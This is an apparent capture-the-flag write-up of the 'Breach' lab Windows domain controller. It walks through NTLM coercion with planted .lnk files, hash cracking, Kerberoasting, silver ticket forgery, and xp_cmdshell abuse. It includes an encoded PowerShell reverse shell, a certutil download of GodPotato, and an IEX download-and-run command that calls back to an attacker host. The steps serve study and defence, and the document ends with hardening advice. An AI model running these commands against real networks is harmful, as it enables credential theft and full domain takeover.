---
title: "Breach"
slug: "breach"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "guest-access--share-enumeration"
    label: "Guest Access & Share Enumeration"
  - id: "coercing-an-ntlmv2-hash"
    label: "Coercing an NTLMv2 Hash"
  - id: "user-flag"
    label: "User Flag"
  - id: "kerberoasting"
    label: "Kerberoasting"
  - id: "silver-ticket-forgery"
    label: "Silver Ticket Forgery"
  - id: "privilege-escalation"
    label: "Privilege Escalation"
  - id: "root-flag"
    label: "Root Flag"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

I kicked things off with a full TCP service scan to map the attack surface.

```
$ nmap --min-rate=3000 --max-retries=3 -T4 -sCV -Pn -n 10.129.121.229
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 00:18 +0200
Nmap scan report for 10.129.121.229
Host is up (0.034s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-09 22:18:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.121.229:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-10-09T22:18:26
|_Not valid after:  2056-10-09T22:18:26
|_ssl-date: 2026-10-09T22:19:30+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   10.129.121.229:1433:
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|     DNS_Tree_Name: breach.vl
|_    Product_Version: 10.0.20348
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-09T22:19:30+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2026-10-08T22:15:41
|_Not valid after:  2027-04-09T22:15:41
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-09T22:18:50+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-10-09T22:18:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.00 seconds
```

> **Note:** Beyond the standard AD stack, MSSQL on 1433 is the unusual addition here, and the one I'll want to come back to.

I added an /etc/hosts entry for the domain controller before going further.

```
$ echo '10.129.121.229    breach breach.vl breachdc.breach.vl' | sudo tee -a /etc/hosts
```

## Guest Access & Share Enumeration

I tried a guest (null) SMB session, and it worked.

```
$ nxc smb breach.vl -u 'guest' -p ''
SMB         10.129.121.229  445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.121.229  445    BREACHDC         [+] breach.vl\guest:
```

With guest access, I brute-forced RIDs to build a list of valid usernames.

```
$ nxc smb breach.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | awk -F '\' '{print $2}' | awk -F ' ' '{print $1}' | tr '[:upper:]' '[:lower:]' > users.txt
```

I attempted ASREPRoasting against the user list, but came up empty.

```
$ impacket-GetNPUsers breach.vl/guest@breachdc.breach.vl -no-pass -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User breachdc$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire.pope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User julia.wong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hilary.reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User diana.pope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jasmine.price doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User george.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lawrence.kaur doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jasmine.slater doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hugh.watts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User christine.bruce doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_mssql doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Luckily the guest account could enumerate shares, and `share` even had write permissions.

```
$ nxc smb breach.vl -u guest -p '' --shares
SMB         10.129.121.229  445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.121.229  445    BREACHDC         [+] breach.vl\guest:
SMB         10.129.121.229  445    BREACHDC         [*] Enumerated shares
SMB         10.129.121.229  445    BREACHDC         Share           Permissions     Remark
SMB         10.129.121.229  445    BREACHDC         -----           -----------     ------
SMB         10.129.121.229  445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.121.229  445    BREACHDC         C$                              Default share
SMB         10.129.121.229  445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.121.229  445    BREACHDC         NETLOGON                        Logon server share
SMB         10.129.121.229  445    BREACHDC         share           READ,WRITE
SMB         10.129.121.229  445    BREACHDC         SYSVOL                          Logon server share
SMB         10.129.121.229  445    BREACHDC         Users           READ
```

I browsed the share, but the interesting per-user folders were locked down and I found nothing useful.

```
$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use share
# ls
drw-rw-rw-          0  Sat Oct 10 00:49:09 2026 .
drw-rw-rw-          0  Tue Sep  9 12:35:32 2025 ..
drw-rw-rw-          0  Thu Feb 17 12:19:36 2022 finance
drw-rw-rw-          0  Thu Feb 17 12:19:13 2022 software
drw-rw-rw-          0  Sat Oct 10 00:47:42 2026 transfer
# cd transfer
# ls
drw-rw-rw-          0  Sat Oct 10 00:47:42 2026 .
drw-rw-rw-          0  Sat Oct 10 00:49:09 2026 ..
drw-rw-rw-          0  Thu Feb 17 12:23:51 2022 claire.pope
drw-rw-rw-          0  Thu Feb 17 12:23:22 2022 diana.pope
drw-rw-rw-          0  Thu Apr 17 02:38:12 2025 julia.wong
# cd claire.pope
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# cd diana.pope
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# cd julia.wong
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

> **Note:** The interesting folders are locked, yet the share is writable and clearly in use — perfect for dropping a file that forces a callback.

## Coercing an NTLMv2 Hash

I used `ntlm_theft` from [this](https://github.com/Greenwolf/ntlm_theft) repository to create a malicious .lnk file.

```
$ python3 ntlm_theft.py -g lnk -s 10.10.14.56 -f click_me
Created: click_me/click_me.lnk (BROWSE TO FOLDER)
Generation Complete.
```

To maximise the odds, I dropped the .lnk into every available folder.

```
$ smbclient -U 'guest%' //breachdc.breach.vl/share -c 'put click_me.lnk;put click_me.lnk finance\click_me.lnk;put click_me.lnk software\click_me.lnk;put click_me.lnk transfer\click_me.lnk'
putting file click_me.lnk as \click_me.lnk (1.6 kB/s) (average 1.6 kB/s)
putting file click_me.lnk as \finance\click_me.lnk (1.7 kB/s) (average 1.6 kB/s)
putting file click_me.lnk as \software\click_me.lnk (1.8 kB/s) (average 1.7 kB/s)
putting file click_me.lnk as \transfer\click_me.lnk (2.2 kB/s) (average 1.8 kB/s)
```

I started Responder and soon caught an NTLMv2 hash from Julia.Wong.

```
$ sudo responder -I tun0
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.121.229
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:bddd1826ba2f3d87:A039FDD428EF4FA79BA54A58A2FA502C:010100000000000000ECA9C94F58DD01AFD20E916E49926700000000020008004D005A0059004C0001001E00570049004E002D0033003900590048004C0052005100570033004B004C0004003400570049004E002D0033003900590048004C0052005100570033004B004C002E004D005A0059004C002E004C004F00430041004C00030014004D005A0059004C002E004C004F00430041004C00050014004D005A0059004C002E004C004F00430041004C000700080000ECA9C94F58DD01060004000200000008003000300000000000000001000000002000003805AE83C119C3900C5FA91CB2F362B6F8E5ACF27C1AA18B04C8832F17A2360C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350036000000000000000000
```

I fed the hash to John and it cracked almost instantly.

```
$ john julia.wong.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Computer1        (Julia.Wong)
1g 0:00:00:00 DONE (2026-10-10 00:50) 9.090g/s 1117Kp/s 1117Kc/s 1117KC/s bratz1234..monforte
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

> **Note:** I now hold my first set of working domain credentials: `Julia.Wong : Computer1`.

## User Flag

I authenticated to the share with the new credentials and found the user flag in Julia's directory.

```
$ smbclient -U 'julia.wong%Computer1' //breachdc.breach.vl/share
Try "help" to get a list of possible commands.
smb: \> cd transfer\
smb: \transfer\> cd julia.wong\
smb: \transfer\julia.wong\> ls
  .                                   D        0  Thu Apr 17 02:38:12 2025
  ..                                  D        0  Sun Oct 11 00:35:08 2026
  user.txt                            A       32  Thu Apr 17 02:38:22 2025

        7863807 blocks of size 4096. 1471650 blocks available
smb: \transfer\julia.wong\> get user.txt
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \transfer\julia.wong\> exit
$ cat user.txt
55d3************************3dda
```

## Kerberoasting

Now that I held valid domain credentials, I tried Kerberoasting and pulled a hash for the svc_mssql account.

```
$ nxc ldap breachdc.breach.vl -u julia.wong -p Computer1 --kerberoast kerberoast.txt
LDAP        10.129.121.229  389    BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.121.229  389    BREACHDC         [+] breach.vl\julia.wong:Computer1
LDAP        10.129.121.229  389    BREACHDC         [*] Skipping disabled account: krbtgt
LDAP        10.129.121.229  389    BREACHDC         [*] Total of records returned 1
LDAP        10.129.121.229  389    BREACHDC         [*] sAMAccountName: svc_mssql, memberOf: [], pwdLastSet: 2022-02-17 11:43:08.106169, lastLogon: 2026-10-10 00:18:22.829114
LDAP        10.129.121.229  389    BREACHDC         $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*$1a50081bfae7b4b257983869a683a2c8$2ca13a19d3db87dce66f79c2003a0b8909f5c1235fcad574dda2bc0c47159eea3c69e0240003b20dd85e7535f51e278cb46b7fb189654a17e2d6e2ff4481e6736dbea2a5e1dbcf36838150b33dd932810ee0161a1bac531de1b49b79edeaf21edc030d9323bc239ffeb67f9fdf881101ed8e3872aa6a29b281aee0d8c3a88baeccf10e18f6a2ae71ecd093b9063b2917df4fe8d2aeed321320358d281365de514b4879126158f58a6f8474e5cd50f8333ec5acd0bcc205655492cf6bbe11f3dd4a50ece4201f06ad426f83d414664d488bbebdc4c30fe8574e77a1f7ba36c2f6d487fc98f8aedb78f9327c6d291f4dbf151d26211cce4ffa99ca83dbb9ddb2dfc3319f81ca884cb8bd2b568fdbf66dbf6a557766c5bc131595661e1244b08fa696089293bbd00c22ce43be8cc7bd2481dcee3a68165ce2c09db6e62ad1be7aed7de9522c11031bec90d0839de90d27e40483872665eb0f0467a1a9e62b4c41b12278004e8d2e91b4c4d8ce3b5ba096dad4a3f83b4e26291dfc9dd2b17e1af8c23892f8abc8e85e6c5164c2326111f8511bbf72753ab9571f312c4b9c1c2db529378616c368170b771f533d91b9b756e1724f29a3ef21846ca1c56d701c2ad57c7135c92e555d2ec41e61d5adc0df2f5b13c69f492336d8c9555f842c6b3880343c3ebfe0ca5d308bcddfae96100475a4d8e68d1797c68e9581c3e2d5deee532977705ae84977f9bb8d9053ca7170010a21c237a317c479a6c3dc6d84520cf2b0f91173a2acbe75f592294006f11f3d36ef867cfd764bb73941aaf2aafbe17927ce36739850825a14bdb227cba2a8e2ea2fddac5319b8b0fcead8bb54c241d4ba931881ad7988abafce17394ddae35098543611c139e51c17064bd28d4d04306f0b182ca8c16d0a46ab37e75ff0e0372d0801369c5f6e058eaa8758b21026ef01ad25f5056c98693149e1ac9cf5cc2e827b38f4215d7ba7f7e0abc31e911d0cd36013a59bee57eeded03c0b68dbcd18186dcba234ede3938d81318b5e6628b4bd35338fd5f79d8233db759a704273f32d860a31836e55465ababbc16b0be720182f6b23d979695b4bda033f5d8bff50764baeac314a0b50528f714b950242ce4fd5d2ee3c5fa8ef260375e538ae7d20bb60f21660be908ff499e72a7ed3192f1c7ae36cbe57be5746e42f04c9d37417d5d0c36c16f779c2b84df60556942231ec7cf9724d5d546185778818fb77bfbfd9b908fe9b7b78c1ab00182f51d461953ae10aef48b9cb4271cd1dae976b3b7c9f9c79d4a4c6b4be24c1056f94ebdd831ff8a014a8d6f0ee9f4dc1fbcdac5ea791313c88394043c53942194db1054b3df2fd5a6b7a1abeb46f831a9f208ee41cb0ff1325b760374f1dca3d7f42c219eff7ef86e2e8e1039656aa0c9eb967b0c47eb9db1bca7d518a536d0a4828534947f966ee4f6f6387a0d2d1a6211de37ff5a3b9f7b7cd
```

Again, the hash fell to rockyou without any trouble.

```
$ john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)
1g 0:00:00:00 DONE (2026-10-10 00:53) 16.66g/s 887466p/s 887466c/s 887466C/s chloelouise..spook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Silver Ticket Forgery

MSSQL access as svc_mssql turned up nothing, so I pivoted to forging a silver ticket, beginning by deriving the account's NT hash from its password.

```
$ pypykatz crypto nt 'Trustno1'
69596c7aa1e8daee17f8e78870e25a5c
```

I forged a silver ticket with ticketer, adding the Domain Admins group SID to the PAC.

```
$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -extra-sid S-1-5-21-2330692793-3312915120-706255856-512 -domain breach.vl -spn 'MSSQLSvc/breachdc.breach.vl:1433' -dc-ip 10.129.121.229 svc_mssql
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/svc_mssql
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in svc_mssql.ccache
```

> **Note:** Silver tickets skip KDC validation entirely, which is why stuffing the Domain Admins SID into the PAC just works.

With the forged ticket, I logged into MSSQL as Administrator and enabled the xp_cmdshell procedure.

```
$ KRB5CCNAME=svc_mssql.ccache impacket-mssqlclient -k -no-pass breachdc.breach.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

## Privilege Escalation

I started a listener and ran a base64-encoded PowerShell reverse shell (from revshells.com) through xp_cmdshell.

```
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

The shell came back as svc_mssql, and as expected it held SeImpersonatePrivilege.

```
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.121.229] 60713

PS C:\Windows\system32> whoami
breach\svc_mssql
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> **Note:** `SeImpersonatePrivilege` lets a process impersonate any client that authenticates to it — exactly the primitive GodPotato abuses to reach SYSTEM.

I transferred [GodPotato](https://github.com/BeichenDream/GodPotato) from my machine using certutil.

```
PS C:\Windows\system32> certutil -f -split -urlcache http://10.10.14.56:8000/GodPotato-NET4.exe \users\svc_mssql\godpotato.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

I saved a base64-encoded PowerShell reverse shell as shell.ps1, served it over a Python HTTP server, and ran GodPotato to execute it.

```
PS C:\Windows\system32> \users\svc_mssql\godpotato.exe -cmd "powershell IEX(IWR -URI http://10.10.14.56:8000/shell.ps1 -UseBasicParsing)"
```

## Root Flag

I caught a reverse shell as nt authority\system and read the root flag.

```
$ rlwrap nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.121.229] 62827

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat \users\administrator\desktop\root.txt
fc98************************4345
```

## Key Takeaways

**Anonymous Access Is a Foothold** — A guest/null SMB session was enough to enumerate users via RID brute-forcing, leak the domain SID, and discover a writable share. Disable anonymous and guest access, and restrict share permissions to the principals that actually need them.

**Writable Shares Enable NTLM Coercion** — Write access to a folder that domain users browse let me plant a malicious `.lnk` that coerced `Julia.Wong` into authenticating back to me, surrendering a crackable hash. Never grant write access to shares casually, and consider SMB signing and egress filtering to blunt relay and coercion attacks.

**Service Account Passwords Are Kerberoasting Fuel** — A weak, crackable password on `svc_mssql` fell to `rockyou.txt` in seconds, handing over its Kerberos key. Use long, random service-account passwords or gMSAs so the resulting TGS hash can't be cracked offline.

**Silver Tickets Forge Arbitrary Privilege** — Because the forged ticket is signed with the service key and never validated against the KDC, injecting the Domain Admins SID into its PAC was enough to become Administrator on MSSQL. Enforce PAC validation where possible and monitor for anomalous ticket use.

**SeImpersonatePrivilege Is Game Over** — A service account holding `SeImpersonatePrivilege` is one GodPotato away from SYSTEM. Grant it only where strictly required, and remember that any code execution as such an account effectively means local SYSTEM.
